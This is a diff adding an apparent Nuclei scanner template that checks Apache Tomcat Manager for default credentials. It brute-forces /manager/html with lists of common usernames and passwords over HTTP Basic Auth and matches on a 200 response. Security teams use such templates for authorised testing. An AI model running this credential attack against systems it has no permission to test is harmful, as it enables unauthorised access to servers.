@@ -1,0 +1,95 @@
+id: tomcat-manager-default
+info:
+  name: tomcat-manager-default-password
+  author: pdteam
+  severity: high
+
+requests:
+
+  - payloads:
+      username:
+        - tomcat
+        - admin
+        - administrator
+        - developer
+        - ovwebusr
+        - j2deployer
+        - cxsdk
+        - ADMIN
+        - xampp
+        - tomcat
+        - QCC
+        - root
+        - role1
+        - role
+        - tomcat
+        - role1
+
+      password:
+        - tomcat
+        - admin
+        - OvW*busr1
+        - j2deployer
+        - kdsxc
+        - ADMIN
+        - xampp
+        - s3cret
+        - QLogic66
+        - root
+        - role1
+        - changethis
+        - j5Brn9
+        - guest
+        - password
+        - test
+        - 12345
+        - 123456
+        - 12345678
+        - 123qwe
+        - Passw@rd
+        - Passw@rd!
+        - Passw@rd1
+        - Pa$$w0rd
+        - Pa$$w@rd
+        - Admin
+        - Administer
+        - administer
+        - administrator
+        - developer
+        - dietpi
+        - letmein
+        - logon
+        - maintaince
+        - marketing
+        - postgres
+        - qwerty
+        - raspberry
+        - root
+        - techsupport
+        - testadmin
+        - toor
+        - uploader
+        - webadmin
+        - webmaster
+
+    attack: clusterbomb  # Available options: sniper, pitchfork and clusterbomb
+
+    raw:
+      # Request with simple param and header manipulation with DSL functions
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - Apache Tomcat
